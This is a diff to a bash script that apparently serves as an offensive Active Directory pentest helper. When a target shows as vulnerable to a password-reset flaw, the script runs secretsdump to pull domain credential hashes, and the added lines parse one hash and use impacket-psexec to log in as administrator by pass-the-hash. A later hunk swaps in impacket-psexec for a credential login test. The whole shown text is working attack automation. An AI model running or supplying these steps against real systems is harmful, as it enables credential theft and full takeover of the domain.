@@ -503,8 +503,10 @@ if [ $answer = y ] ; then
 	cd ..
 	if grep "Target vulnerable, changing account password to empty string" zero.txt
 	then
-		echo -e '\E[31;40m' 'Running Secrets Dump and saving to secretsdump.txt'; tput sgr0
+		echo -e '\E[31;40m' 'Running Secrets Dump and saving to secretsdump.txt (thanks dze64)'; tput sgr0
 		secretsdump.py -no-pass -just-dc "$DOMAIN"/"$SHARENAME\$"@$DOMAINIP > secretsdump.txt
+		hash=$(cat secretsdump.txt | sed '5q;d' | cut -d ':' -f 3,4)
+		impacket-psexec -hashes $hash administrator@$DOMAINIP 
 	else
 		echo -e '\E[31;40m' 'Target does not seem vulnerable'
 	fi
@@ -534,7 +536,7 @@ fi
 
 read -p "Test for PSExec Login (y/n)" answer
 if [ $answer = y ] ; then
-	psexec.py "$DOMAIN/$USER:$PASS@$DOMAINIP"
+	impacket-psexec "$DOMAIN/$USER:$PASS@$DOMAINIP"
 elif [ $answer = n ]; then
 	echo "Not trying PSExec Login"
 else
